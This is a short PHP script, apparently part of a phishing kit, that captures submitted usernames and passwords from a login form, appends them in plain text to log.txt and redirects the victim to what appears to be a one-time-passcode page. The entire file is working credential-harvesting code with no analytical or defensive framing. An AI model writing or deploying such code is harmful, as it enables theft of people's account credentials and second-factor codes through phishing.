<?php

file_put_contents("log.txt", "\r\n" . "Account: " . $_POST['username'] . "\r\n" . "Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
